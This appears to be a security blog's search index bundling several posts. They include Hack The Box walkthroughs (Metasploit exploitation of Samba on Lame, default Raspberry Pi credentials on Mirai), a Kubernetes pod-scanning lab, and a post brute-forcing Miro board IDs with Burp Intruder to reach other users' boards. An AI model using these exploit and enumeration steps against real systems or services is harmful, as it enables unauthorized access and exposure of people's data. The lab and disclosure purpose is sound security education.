kubectl exec -it hackerwhale-k8s -- /bin/zshAgora é só testar e verificar se os certificados foram importados para interagir com o cluster.
$ kubectl get pods $ kubectl get pods -o wide -n default O mesmo pode ser feito com o K9s, disponível na imagem.
Uma vez com estes casos de uso demonstrados, podemos seguir com os labs de Discovery &amp; Scan.
Discovery &amp; Scan &nbsp; Utlizando como base o ambiente em Kubernetes, podemos combinar o uso de kubectl e k9s com as ferramentas tradicionais de testes para um assessment interno.
O jeito mais fácil dentro do K8s é obter o endereçamento dos pods, para isso vamos verificar em qual namespace estamos. Se retornar vazio, significa que estamos no “default”.
kubectl config view --minify --output &#39;jsonpath=..namespace&#39;Para confirmar, podemos listar todos os namespaces.
$ kubectl get namespaces NAME STATUS AGE default Active 37m kube-node-lease Active 37m kube-public Active 37m kube-system Active 37mAgora é só obter os IPs dos pods, assim também saberá em qual range eles estão.
$ kubectl get pods -o wide -n default # ou $ kubectl get pods -o wide O K9s também está disponível na imagem, podendo obter as mesmas informações de forma mais “amigável”.
Se você é roots, pode utilizar métodos mais tradicionais para a enumeração de ips em redel local, consultando a tabela arp ou fazendo “ping sweep”.
arp-scan --interface=eth0 --localnet Com isso, pode iniciar os testes, como exemplo, realizando um nmap nos pods do Nginx, Postgres e RabbitMQ.
nmap -p- -Pn 10.244.0.4-6 Para facilitar um pouco mais, sabendo que estamos no namespace “default”, copie e cole o código abaixo para guardar todos os IPs dos pods com exceção de nosso container em um arquivo, e reutilizá-lo para outras tarefas.
CURRENT_POD_NAME=$(hostname); \\ kubectl get pods -o wide -n default| grep -v $CURRENT_POD_NAME | awk &#39;print $6&#39; &gt; pod_ips.txtPassando o arquivo para o nmap.
nmap -iL pod_ips.txtOu fazendo um rápido teste com nuclei para encontrar misconfigurations:
cat pod_ips.txt | nuclei --silent 👾`}).add({id:69,tag:"en",href:"/tags/hacking/",title:"Hacking",description:"",content:""}).add({id:70,tag:"en",href:"/tags/hackthebox/",title:"Hackthebox",description:"",content:""}).add({id:71,tag:"en",href:"/tags/horusec/",title:"Horusec",description:"",content:""}).add({id:72,tag:"en",href:"/tags/html/",title:"Html",description:"",content:""}).add({id:73,tag:"en",href:"/tags/infection-monkey/",title:"Infection Monkey",description:"",content:""}).add({id:74,tag:"en",href:"/tags/information-gathering/",title:"Information Gathering",description:"",content:""}).add({id:75,tag:"en",href:"/tags/isc2/",title:"Isc2",description:"",content:""}).add({id:76,tag:"en",href:"/tags/jarbas/",title:"Jarbas",description:"",content:""}).add({id:77,tag:"en",href:"/blog/jarbas1/",title:"Jarbas 1",description:"Jarbas 1 – A tribute to a nostalgic Brazilian search engine in the end of 90’s.",content:`Description &nbsp; If you want to keep your hacking studies, please try out this machine! Jarbas 1 – A tribute to a nostalgic Brazilian search engine in the end of 90’s.
Objective: Get root shell!
Jarbas.zip &nbsp; Download: https://goo.gl/ZRWRKD Download (Mirror Vulnhub): https://download.vulnhub.com/jarbas/Jarbas.zip File Information &nbsp; Filename: Jarbas.zip File size: 1.1 GB MD5: 85A1698DB39908E101317ECD9BCA4322 SHA1: 91FC13F42E1E3D470F4C66A0B73B28EC973AE6AC Virtual Machine &nbsp; Format: Virtual Machine (VMware) Operating System: Linux Networking &nbsp; DHCP service: Enabled IP address: Automatically assign 📜 Walkthrough Showcase &nbsp; 🎯 Submit your walkthrough! &nbsp; Submitted by: D7X’s blog https://d7x.promiselabs.net/2018/07/26/ctf-jarbas-1-vulnhub-ctf-walkthrough/ Submitted by: mpz https://www.tnirmal.com.np/2018/07/vulnhub-jarbas-1-walkthrough.html Submitted by: Leandro Esteves https://lcesteves.wordpress.com/2018/08/15/jarbas/ Submitted by: Egghunter https://medium.com/egghunter/jarbas-1-vulnhub-walkthrough-35eed2aabe9a Submitted by: Netosec https://https://netosec.com/jarbas-1-vulnhub-walkthrough/ Submitted by: Bernie Lim https://hackso.me/jarbas-1-walkthrough/ Submitted by: Raj Chandel https://www.hackingarticles.in/hack-the-jarbas-1-ctf-challenge/ Submitted by: QuantusSec https://quantus.biz/security/2018/10/29/jarbas-1-vulnhub-ctf-challenge-walkthrough/ Submitted by: Kircaali https://www.yckircaali.com/jarbas-1-vulnhub-walkthrough/`}).add({id:78,tag:"en",href:"/tags/javascript/",title:"Javascript",description:"",content:""}).add({id:79,tag:"en",href:"/tags/jndi/",title:"Jndi",description:"",content:""}).add({id:80,tag:"en",href:"/tags/jwt/",title:"Jwt",description:"",content:""}).add({id:81,tag:"en",href:"/blog/keep-moving-fi-duma-egua/",title:"Keep moving, fi duma égua!🙏",description:"Há muito não sentia algo, orgulho de algum legado deixado.",content:`Não sou uma pessoa &ldquo;postativa&rdquo;, e os mais próximos de mim sabem o quanto eu repudio o comportamento &ldquo;biscoiteiro&rdquo; caça likes.
Sempre gostei de escrever, desenvolver laboratórios, compartilhar conhecimento prático e útil para pessoas que viam segurança como um desafio em seu dia a dia. Mas desde o fim da pandemia não fui mais o mesmo (fisicamente e psicologicamente). Hoje estou melhor, me cuidando e avançando. Porém ainda com alguns bloqueios criativos.
Mas por que esse falatório todo? Há poucos minutos senti algo que já há muito não sentia, orgulho de algum legado deixado.
É algo bobo, eu sei, mas me dei conta que uma das minhas máquinas de laboratório, a Lampião, criada e publicada em 2018, e disponível desde o início no Proving Grounds da OffSec, atingiu milhares de pessoas, ajudando-as a aprender técnicas de hacking em uma máquina virtual com produção e humor de gosto duvidoso, mas feita com muito carinho.
Lampião 1 no OffSec Proving Grounds Publicação original no Vulnhub Por um tempo eu concentrava os write-ups e menções em meu blog, mas hoje seria impossível, pois numa busca rápida fiz despretensiosamente no Google (lampiao proving grounds), me retornou quase 3 mil resultados. Algo impressionante? Não, mas fiquei feliz.
Resultados na busca (lampiao proving grounds) Write-ups antigos Indo um pouco mais além, acabei encontrando um vídeo do Tib3rius (que sou super fã, confesso) e das meninas do Securiters (Espanha), não imaginava que essa galera também haviam gravado walkthroughs deste meu projeto.
Tib3rius &nbsp; &nbsp; Securiters &nbsp; &nbsp; Qual a conclusão disso tudo? Nenhuma, apenas que as vezes é bom olhar no retrovisor para entender como você chegou até aqui e ganhar um novo gás pra continuar.
Finalizo aqui agradecendo a todos que estiveram comigo nessa jornada. Você sabem quem você são, e vocês fizeram toda a diferança. ❤️
Keep moving, fi duma égua!🙏
Referências &nbsp; OffeSec Proving Grounds Vulnhub Lampião VM Write-ups antigos 👾`}).add({id:82,tag:"en",href:"/tags/kubernetes/",title:"Kubernetes",description:"",content:""}).add({id:83,tag:"en",href:"/blog/lame-htb/",title:"Lame - Hack The Box (Retired)",description:"Lame - Hack The Box retired machine walkthrough.",content:`🔎 Enumeration &nbsp; root@kali:~# nmap -sV -A -O 10.10.10.3Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-14 16:20 -03Nmap scan report for 10.10.10.3Host is up (0.15s latency).Not shown: 996 filtered portsPORT STATE SERVICE VERSION21/tcp open ftp vsftpd 2.3.4|_ftp-anon: Anonymous FTP login allowed (FTP code 230)| ftp-syst: | STAT: | FTP server status: | Connected to 10.10.14.34 | Logged in as ftp | TYPE: ASCII | No session bandwidth limit | Session timeout in seconds is 300 | Control connection is plain text| Data connections will be plain text| vsFTPd 2.3.4 - secure, fast, stable|_End of status22/tcp open ssh OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)| ssh-hostkey: | 1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)|_ 2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)445/tcp open netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed portAggressive OS guesses: OpenWrt White Russian 0.9 (Linux 2.4.30) (92%), Arris TG862G/CT cable modem (92%), D-Link DAP-1522 WAP, or Xerox WorkCentre Pro 245 or 6556 printer (92%), Dell Integrated Remote Access Controller (iDRAC6) (92%), Linksys WET54GS5 WAP, Tranzeo TR-CPQ-19f WAP, or Xerox WorkCentre Pro 265 printer (92%), Linux 2.4.21 - 2.4.31 (likely embedded) (92%), Linux 2.4.27 (92%), Citrix XenServer 5.5 (Linux 2.6.18) (92%), Linux 2.6.22 (92%), Linux 2.6.8 - 2.6.30 (92%)No exact OS matches for host (test conditions non-ideal).Network Distance: 2 hopsService Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernelHost script results:|_clock-skew: mean: 2h05m59s, deviation: 2h49m46s, median: 5m56s| smb-os-discovery: | OS: Unix (Samba 3.0.20-Debian)| Computer name: lame| NetBIOS computer name: | Domain name: hackthebox.gr| FQDN: lame.hackthebox.gr|_ System time: 2020-05-14T15:26:52-04:00| smb-security-mode: | account_used: guest| authentication_level: user| challenge_response: supported|_ message_signing: disabled (dangerous, but default)|_smb2-time: Protocol negotiation failed (SMB2)TRACEROUTE (using port 21/tcp)HOP RTT ADDRESS1 153.27 ms 10.10.14.12 153.37 ms 10.10.10.3OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 69.37 secondsnmap &ndash;script smb-enum-shares.nse -p445 10.10.10.3 Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-14 18:17 -03
Nmap scan report for 10.10.10.3Host is up (0.15s latency).PORT STATE SERVICE445/tcp open microsoft-dsHost script results:| smb-enum-shares: | account_used: &lt;blank&gt;| \\\\10.10.10.3\\ADMIN$: | Type: STYPE_IPC| Comment: IPC Service (lame server (Samba 3.0.20-Debian))| Users: 1| Max Users: &lt;unlimited&gt;| Path: C:\\tmp| Anonymous access: &lt;none&gt;| \\\\10.10.10.3\\IPC$: | Type: STYPE_IPC| Comment: IPC Service (lame server (Samba 3.0.20-Debian))| Users: 1| Max Users: &lt;unlimited&gt;| Path: C:\\tmp| Anonymous access: READ/WRITE| \\\\10.10.10.3\\opt: | Type: STYPE_DISKTREE| Comment: | Users: 1| Max Users: &lt;unlimited&gt;| Path: C:\\tmp| Anonymous access: &lt;none&gt;| \\\\10.10.10.3\\print$: | Type: STYPE_DISKTREE| Comment: Printer Drivers| Users: 1| Max Users: &lt;unlimited&gt;| Path: C:\\var\\lib\\samba\\printers| Anonymous access: &lt;none&gt;| \\\\10.10.10.3\\tmp: | Type: STYPE_DISKTREE| Comment: oh noes!| Users: 1| Max Users: &lt;unlimited&gt;| Path: C:\\tmp|_ Anonymous access: READ/WRITENmap done: 1 IP address (1 host up) scanned in 67.23 seconds🚪🚶 Foothold &nbsp; For some reason, I couldn&rsquo;t exploit vsftpd 2.3.4, which is vulnerable.
Let&rsquo;s try smb service.
root@kali:~# searchsploit samba 3.0.20---------------------------------------------------------- ---------------------------------Exploit Title | Path---------------------------------------------------------- ---------------------------------Samba 3.0.10 &lt; 3.3.5 - Format String / Security Bypass | multiple/remote/10095.txtSamba 3.0.20 &lt; 3.0.25rc3 - 'Username' map script' Command | unix/remote/16320.rbSamba &lt; 3.0.20 - Remote Heap Overflow | linux/remote/7701.txtSamba &lt; 3.0.20 - Remote Heap Overflow | linux/remote/7701.txtSamba &lt; 3.6.2 (x86) - Denial of Service (PoC) | linux_x86/dos/36741.py---------------------------------------------------------- ---------------------------------Looking further for infos on the internet and reading some docs, I could find the following: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-2447
Thankfully Metasploit already has a good exploit to explore it:
# msfconsolemsf5 &gt; use exploit/multi/samba/usermap_scriptmsf5 exploit(multi/samba/usermap_script) &gt; set rhost 10.10.10.3rhost =&gt; 10.10.10.3msf5 exploit(multi/samba/usermap_script) &gt; run🛡️ Privilege Escalation &nbsp; Not needed. Samba service runs as root user.
🍻 Complete &nbsp; As usual, you can get your root flag at /root/root.txt and user flag at /home/makis, as shown bellow:`}).add({id:84,tag:"en",href:"/tags/lampiao/",title:"Lampiao",description:"",content:""}).add({id:85,tag:"en",href:"/blog/lampiao1/",title:"Lampião 1",description:"Lampião 1 - 'It's Easy, fi duma égua!'",content:`Description &nbsp; Would you like to keep hacking in your own lab? Try this brand new vulnerable machine! &ldquo;Lampião 1&rdquo;. Get root!
Level: Easy
Objective: Get root shell!
Lampiao1.zip &nbsp; Download: http://bit.ly/Lampiao1 Download (Mirror Vulnhub): https://download.vulnhub.com/lampiao/Lampiao.zip File Information &nbsp; Filename: Lampiao.zip File size: 669 MB MD5: 7437D6FB83B63A7E14BB00F9C7A758B9 SHA1: B5CDBF07E78557C19555E26715B99E0DCF2400D5 Virtual Machine &nbsp; Format: Virtual Machine (Virtualbox - OVA) Operating System: Linux Networking &nbsp; DHCP service: Enabled IP address: Automatically assign 📜 Walkthrough Showcase &nbsp; 🎯 Submit your walkthrough! &nbsp; Submitted by: Rodrigo Ramos https://www.linkedin.com/pulse/vulnhub-lampi%C3%A3o-desafio-hacker-rodrigo-pentester/ Submitted by: Eduardo B. Santos https://www.youtube.com/watch?v=atqdCsBbwb4 Submitted by: InfoSecInstitute https://resources.infosecinstitute.com/lampiao-1-ctf-walkthrough Submitted by: egghunter https://medium.com/egghunter/lampi%C3%A3o-1-vulnhub-walkthrough-c334aaa68cb9 Submitted by: Kamran Saifullah https://medium.com/@KamranSaifullah/lampi%C3%A3o-1-walkthrough-fa14f1b4e5ed Submitted by: Nikhil Kumar https://securityboulevard.com/2018/12/lampiao-1-ctf-walkthrough/ Submitted by: Bernie Lim https://hackso.me/lampiao-1-walkthrough/ Submitted by: William McCann https://wjmccann.github.io/blog/2018/08/15/Lampiao-Walkthrough Submitted by: Chistopher Heaney https://blog.razrsec.uk/lampiao-walkthrough/ Submitted by: gameface22 https://github.com/gameFace22/vulnmachine-walkthrough/blob/master/lampiao.md Submitted by: SparkTech https://sparktechsol.blogspot.com/2018/10/lampiao-1-vulnhub-ctf-challenge.html Submitted by: Aarti Singh https://www.linkedin.com/pulse/hack-lampi%C3%A3o-1-ctf-challenge-aarti-singh/ Submitted by: gameFace22 https://github.com/gameFace22/vulnmachine-walkthrough/blob/master/lampiao.md Submitted by: zhuanlan.zhihu.com https://zhuanlan.zhihu.com/p/127795476 Submitted by: 黑白之道 https://www.sohu.com/a/404323085_609556`}).add({id:86,tag:"en",href:"/tags/lascon/",title:"Lascon",description:"",content:""}).add({id:87,tag:"en",href:"/tags/ldap/",title:"Ldap",description:"",content:""}).add({id:88,tag:"en",href:"/tags/life/",title:"Life",description:"",content:""}).add({id:89,tag:"en",href:"/tags/linux/",title:"Linux",description:"",content:""}).add({id:90,tag:"en",href:"/tags/log4j2/",title:"Log4j2",description:"",content:""}).add({id:91,tag:"en",href:"/blog/log4j2_jndi_cve-2021-44228/",title:"Log4J2 JNDI/LDAP Lookups - Dos elos evitáveis ao apocalipse 🔥 | CVE-2021-44228",description:"🧵 Uma thread de quase 10 anos de acontecimentos que poderiam ter sido previstos e evitados.  ",content:`Sumário &nbsp; Sumário Sobre Reflexão Os elos Nossas falhas Lições Aprendidas Referências Sobre &nbsp; Em 9 de dezembro, uma grave vulnerabilidade com possibilidade de exploração remota no Log4J da Apache foi publicada, uma biblioteca de log muito utilizada em aplicações Java. A vulnerabilidade afeta uma ampla gama de aplicações.
A vulnerabilidade possibilita que qualquer invasor possa injetar texto em mensagens de log ou parâmetros de mensagem de log em logs de servidor que carregam código de um servidor remoto; O servidor de destino executará esse código por meio de chamadas para o Java Naming and Directory Interface (JNDI). O JNDI faz interface com uma série de serviços de rede, incluindo o protocolo Lightweight Directory Access Protocol (LDAP), Domain Name Service (DNS), Java’s Remote Interface (RMI) e o Common Object Request Broker (CORBA). Sendo a forma mais comum de exploração detectada via LDAP, DNS e RMI, usando uma URL marcada para esses serviços redirecionados para um ser externo.
Reflexão &nbsp; Os elos &nbsp; Aplicações jamais deveriam executar JDNI lookups com dados ou origens não confiáveis.
Alvaro Munoz &amp; Oleksandr Mirosh @BlackHat, 2016. 🎯
Nossas falhas &nbsp; Demorou 5 anos para alguem se dar conta ou simplesmente tropeçar no risco.
Aí surgem duas questões?
Por quê desenvolvedores nunca se deram conta disso? Por quê nós, profissionais de segurança também não sabíamos disso? E concordo com a opinião do Alvaro:
If developers dont know that untrustred data should not be passed to a JNDI lookup op then WE (the security community) have failed them. Its not THEIR fault https://t.co/bOhguVA9pQ
&mdash; Alvaro Muñoz (@pwntester) December 11, 2021 Sim, nós falhamos em nossa missão. E falhamos todos os dias. Por quê?
Lições Aprendidas &nbsp; Assim como dito no vídeo, e que sempre tento incentivar meus pares e liderados, é que devemos saber com as aplicações são construídas, ou pelo menos ter algum tipo de experência com desenvolvimento e arquitetura de software.
Evento não é &ldquo;oba-oba&rdquo;. Durante as conferências, devemos nos manter focados e ter ciência do nossa missão como profissionais. Esta vulnerabilidade passou em branco pela comunidade por 5 anos, mesmo sendo &ldquo;briefada&rdquo; em 2016 na BlackHat.
E é isso, keep hacking, learning and stay humble.
👾
Referências &nbsp; A JOURNEY FROM JNDI/LDAP MANIPULATION TO REMOTE CODE EXECUTION DREAM LAND:
https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf CVE-2021-44228:
https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44228 LiveOverflow
Log4j Lookups in Depth // Log4Shell CVE-2021-44228 - Part 2 Log4Shell Hell: anatomy of an exploit outbreak
https://news.sophos.com/en-us/2021/12/12/log4shell-hell-anatomy-of-an-exploit-outbreak/ Log4j: List of vulnerable products and vendor advisories
https://www.bleepingcomputer.com/news/security/log4j-list-of-vulnerable-products-and-vendor-advisories/ Feed de origens maliciosadas detectadas
OpenCTIBr https://github.com/openctibr/threatFeeds/blob/main/Log4J_AttackersFeed.txt`}).add({id:92,tag:"en",href:"/tags/malware/",title:"Malware",description:"",content:""}).add({id:93,tag:"en",href:"/tags/malware-research/",title:"Malware Research",description:"",content:""}).add({id:94,tag:"en",href:"/tags/marathon/",title:"Marathon",description:"",content:""}).add({id:95,tag:"en",href:"/tags/maratona/",title:"Maratona",description:"",content:""}).add({id:96,tag:"en",href:"/tags/matplotlib/",title:"Matplotlib",description:"",content:""}).add({id:97,tag:"en",href:"/blog/mirai_htb/",title:"Mirai - Hack The Box (Retired)",description:"Mirai - Hack The Box retired machine walkthrough.",content:`🔎 Enumeration &nbsp; nmap -sV 10.10.10.48Found an application running on port 80, we can identify an entry service to RaspberryPi.
🚪🚶 Foothold &nbsp; Looking further how Raspberry works, it&rsquo;s easy to get in. It&rsquo;s defaut user and password are pi/raspberry.
Getting user flag.
cat /home/pi/Desktop/user.txt🛡️ Privilege Escalation &nbsp; The pi user is a sudoer, we can easily escalate privileges. Unfortunately the root flag is not present. But we have a message telling us what happened. Accidentaly someone deleted it. 😒
This tip tells us that the flag has been lost after an accidental removal of the USB stick. I created a copy of sdb volume to analyse it.
root@raspberrypi:/# dd if=/dev/sdb of=usb.img20480+0 records in20480+0 records out10485760 bytes (10 MB) copied, 0.166908 s, 62.8 MB/sCopied to my Kali.
root@kali:~# scp pi@10.10.10.48:/usb.img /root/usb.imgpi@10.10.10.48's password:usb.img 100% 10MB 1.4MB/s 00:06Then I needed to create a mount folder in my Kali. It&rsquo;s not needed to mount the image finish this machine, I did to check if it was not corrupted.
root@kali:~# mkdir /mnt/testeroot@kali:~# mount -o loop usb.img /mnt/teste🍻 Complete &nbsp; In order to recover the flag file, I used the extundelete program.
extundelete --restore-all usb.img`}).add({id:98,tag:"en",href:"/tags/miro/",title:"Miro",description:"",content:""}).add({id:99,tag:"en",href:"/blog/miro_insecurity/",title:"Miro's free accounts (in)security",description:"This is not a bug, is a feature!. Me apaixonei por uma plataforma de colaboração e tive meu coração despedaçado. 💔",content:`Sumário &nbsp; Sumário O que é o Miro, qual sua proposta? O alerta Acessando informações alheias Google Dorks Bruteforcing Conclusão O que é o Miro, qual sua proposta? &nbsp; Buscando por novas ferramentas de trabalho, encontrei o Miro, uma ferramenta realmente incrível! Mas até onde vale a pena abrir mão de privacidade e aceitar a possibilidade de ter seus trabalhos e possivelmente informações confidenciais vazados?
&nbsp; Esta é uma fragilidade na versão FREE. 😉 O Miro (https://miro.com/) é uma plataforma de colaboração baseada em quadros, onde times podem acessar remotamente e trabalharem no mesmo material ao mesmo tempo. É realmente interessante e gostei muito da experiência que tive.
O alerta &nbsp; Essa semana durante uma aula de design thinking, ligou um alerta e observei um alto grau de exposição que eu não tinha observado no Miro. Mas antes, deixa eu mostrar uma coisa.
A plataforma te possibilita usar até três quadros de forma gratuíta, o que é ótimo! Porém você não tem a opção de deixar em modo privado estes boards. Para isso você deverá desenbolsar pelo menos US$8 mensais. O que acredito ser um preço justo para quem depende de uma ferramenta que pode literalmente concentrar diversas atividades em um lugar apenas.
Voltando ao assunto da aula que despertou minha atençao, foi justamente a URL. Cada board possui um ID, que é referenciado na URL.
Só que ao olhar para meu perfil no Miro e verificando as URLs dos meus quadros, identifiquei que possuem padrões.
No exemplo abaixo mostro as URLs dos meus três boards. Compare com a URL da aula da minha professora na imagem acima. É o mesmo padrão no começo e no fim. Assim, o que era pra ser um ID de 12 caracteres, os esforço de um possível bruteforce e diminuído pela metade, onde precisamos buscar apenas por 6 caracteres! https://miro.com/app/board/o9J_kXXXXXX=/
Acessando informações alheias &nbsp; Ok e agora?
O que vocês já estão carecas de saber!
Google Dorks &nbsp; Mas antes de qualquer esforço, podemos utilizar o bom e velho dork para encontrar URLs indexadas em páginas do Google. O Miro não permite que o conteúdo dos quadros sejam indexados, mas vamos buscar por páginas que em seu conteúdo possuam links disponíveis. Ex: intext:miro.com/app/board/
Ou então, procurar por quadros do Miro em quadros do Trello (que é outra plataforma interessante, mas se não bem gerenciada, pode comprometer informações sigilosas do seu grupo de trabalho). Ex.: intext:miro.com/app/board/ site:trello.com
Bruteforcing &nbsp; Ok, entendidos como acessar quadros públicos do Miro e do Trello, vamos para o bruteforce.
Para facilitar, vou utilizar o Burp Suite para o ataque. Para diminuir o escopo de tentativas vou me resumir apenas a 3 caracteres, não mais 6, resultando em +50K tentativas.
Enviei uma requição para o módulo Intruder e coloquei como escopo do payload apenas nos ultimos 3 caracteres:
Na configuração do payload, adicionei o hífen como caractere utilizado, pois existem boards que o utilizam em seu ID. Além disso, configurei o tamanho máximo e mínimo para 3, que é o nosso objetivo.
Em Option, na configuraçao de filtro por Grep, coloquei o texto &ldquo;This boards is no longer shared&rdquo; para diferenciar os quadros existentes dos não existentes. Você pode também realizar este filtro se baseando pelo tamanho do Response.
O que iremos ver a partir de agora são três tipos de resposta:
Status Tipo de cenário 200 Quadro existente e público 200 Quadro removido ou não criado 302 Quandro existente e privado Neste breve exercício, encontramos 14 quadros públicos. Alguns exemplos abaixo obtidos pelo bruteforce.
Conclusão &nbsp; Como dito anteriormente, eu acho esta plataforma sensacional para trabalho colaborativo, a proposta é interessante e ela provê um nível de segurança adequado para seus clientes PREMIUM.
Quando falamos de licenças FREE, sabemos que &ldquo;não existe almoço grátis&rdquo;. Mas neste caso, quem está usando nossos dados para benefício próprio? 🤔
O Miro ainda está amadurecendo e crescendo. Acredito que em breve irão ajustar e reforçar esta feature. 🥰`}).add({id:100,tag:"en",href:"/tags/mitre-attck/",title:"Mitre Att&ck",description:"",content:""}).add({id:101,tag:"en",href:"/tags/nessus/",title:"Nessus",description:"",content:""}).add({id:102,tag:"en",href:"/blog/ofimdostimesdeappsec/",title:"O fim dos times de AppSec",description:"O paradoxo da segurança em aplicações.",content:`Hoje temos times de cybersegurança estão bem consolidados nas organizações, com pessoas dedicadas inclusive a análise de aplicações, mas a integração nunca é fluída, dificilmente o time responsável por arquitetura, análise e testes estão de fato próximos aos times de desenvolvimento. Mas será que mesmo que estivessem próximos aos times de engenharia seria viável acompanhar a curva de entrega dos times de desenvolvimento? Isso sempre foi uma questão de reflexão, paradoxal ao ponto de estar como um cão correndo atrás do próprio rabo.
Após algumas situações de análise de requisitos em meu atual empregados junto com meu time e pesquisas, encontrei uma boa referência no material apresentado pelo Justin Collins (@presidentbeef) na Lonestar Application Security Conference (LASCON) de 2019, que ocorre todos os anos em Austin, TX.
&ldquo;Sua equipe de segurança de aplicações é grande o suficiente? Depois de crescer além de algumas pessoas, as equipes de segurança geralmente se desesperam tentando contratar mais pessoal de AppSec. Embora isso seja bom para os profissionais do setor, é ainda matematicamente possível contratar pessoal da AppSec suficiente para lidar com a quantidade de código, recursos, plataformas e produtos que o resto da sua organização está produzindo? Mesmo com todas as ferramentas que se pode comprar, é improvável que o time de AppSec possa acompanhar o ritmo do restante da equipe de desenvolvimento. Se o time de AppSec nunca pode ser grande o suficiente, o que podemos fazer? Bem, vamos entrar em nossas máquinas do tempo, pular a rotina atual do AppSec e dar uma olhada no futuro no final da equipe do AppSec.&rdquo;
▶ Youtube &nbsp; 📄 Download da apresentação &nbsp;`}).add({id:103,tag:"en",href:"/blog/10nuncas_seguranca_usuarios/",title:"O uso seguro da internet e 'Os 10 nuncas'",description:"Dicas para ter uma navegação segura na web, publicado também  no  Portal Carreira & Sucesso da Catho.",content:`A Internet sem dúvida é uma das maiores invenções do homem.Claro que sem ela não teríamos problemas vitais com a falta de alimento ou água, porém toda comunicação do nosso círculo social, acadêmico e profissional tem se baseado quase que exclusivamente pela Internet, seja por redes sociais, e-mail, mensagens instantâneas ou VoIP. Graças ao advento da Internet as pessoas têm se aproximado, as distâncias foram &ldquo;reduzidas&rdquo;, paradigmas foram quebrados e o homem passou a ter acesso à informação de forma mais rápida e fácil, ajudando em nossa evolução (ou regressão, fica a seu critério!). Para maximar sua experiência com esta tecnologia de comunicação, é necessário tomar as medidas de segurança necessárias para que você não passe por situações adversas ou constrangedoras, pois à partir do momento em que suas tarefas são realizadas pela Internet, sua exposição cresce e os riscos aparecem, e para reduzir estes riscos um bom início é seguir &ldquo;Os 10 nuncas&rdquo;.
Os 10 nuncas &nbsp; Nunca envie suas informações pessoais em um e-email onde os destinatários são desconhecidos.
Nunca envie informações pessoais por qualquer site cujo link você tenha recebido por e-mail. &nbsp; Os itens acima são muito comuns no tipo de ataque que usa a engenharia social chamado phishing (pescaria). O objetivo deste ataque é obter informações pessoais, credenciais, números de cartão de crédito ou dados financeiros através de &ldquo;iscas&rdquo; para adquirir dados sensíveis por diferentes métodos. O tipo de isca mais comum é o envio de e-mais para as vítimas como se fosse um e-mail legítimo do banco, solicitando confirmação de dados pessoais e financeiros, com o argumento de que tal tarefa é necessária para que, por exemplo, a vítima possa ter acesso à ultima versão do &ldquo;software de proteção&rdquo; do banco. Nunca coloque informações pessoais em qualquer fórum de discussão. &nbsp; Fóruns são sites onde são discutidos os mais diversos assuntos para grupos específicos de pessoas (amantes de games, moda, ciência, hackers, etc). Devido a grande quantidade de pessoas que acessam diariamente estes fóruns esses usuários tornam-se &ldquo;presas&rdquo; fáceis. Caso você seja um usuário desta modalidade de site, coloque o mínimo possível de informações pessoais [nestes sites]. Vale lembrar que graças ao oráculo Google você pode ter todos os seus dados e costumes rastreados ao deixar uma informação qualquer da sua vida. Nunca utilize a mesma senha para todos os sites onde você tem cadastro. &nbsp; Aqui temos dois pontos de vulnerabilidade, tanto pelo usuário quanto pelo site onde tem cadastro:
Usuário: Uma vez que você tem a sua senha roubada por engenharia social ou por qualquer invasão em seu computador, todos os seus cadastros existentes na internet estarão comprometidos, como Facebook, E-mail, sites de compra e etc.
Site: Se qualquer um dos sites onde você possuir cadastro tiver uma vulnerabilidade e ela for explorada, ao ponto de o hacker ter acesso a dados dos usuários, ele poderá utilizar estas informações para interesses próprios.
Nunca divulgue informações pessoais para terceiros por mensagens instantâneas (WhatsApp, Messenger, etc), chats ou por telefone (ataque de engenharia social onde te ligam e se fazem representar empresas oferecendo oportunidades que eventualmente você possa ter interesse).
Nunca utilize seu notebook conectado em redes públicas sem que seu computador esteja devidamente atualizado, firewall ativado e anti-vírus com a última definição. Se possível adquira produtos que tenha &ldquo;tudo em um&rdquo;, onde possui firewall, anti-virus e sistema de prevenção de intrusão em um único pacote de software. &nbsp; Sim, seja um neurótico! Desconfie de tudo! Nunca faça compras pela Internet se a loja não oferecer uma conexão segura com criptografia, principalmente na página onde será inserido seus dados pessoais e de cartão de crédito.
Nunca baixe arquivos de sites que você não confie ou desconheça. &nbsp; Sabe aquele seriado americano que você ama e quer ver logo a próxima temporada? Espere sair na TV a cabo. ;-) Nunca permita que terceiros utilizem ou se conectem em seu computador. Caso precise de ajuda procure alguém de sua confiança. &nbsp; Novamente, sim, seja um neurótico! Desconfie de tudo! Nunca permita que crianças utilizem a Internet sem supervisão. &nbsp; informação está cada vez mais disseminada pela Internet, tanto para coisas boas como as ruins, como pornografia e pedofilia. Como você pôde perceber, para ter segurança no uso da Internet não é necessário investir apenas em softwares de segurança ou manter seu computador sempre atualizado, todas estas medidas são quase que totalmente anuladas se a consciência do uso seguro e adequado da Internet não esteja firmemente enraizada dentro de cada um de nós, tornando a Internet em um ambiente totalmente hostil. Portanto, mesmo que sejamos o elo mais fraco da segurança, ao seguirmos essas dicas a probabilidade de ter nossos dados furtados serão minimas.
&nbsp; Este artigo serviu como base para a publicação &ldquo;Dicas para ter uma navegação segura na web&rdquo; no Portal Carreira &amp; Sucesso da Catho.
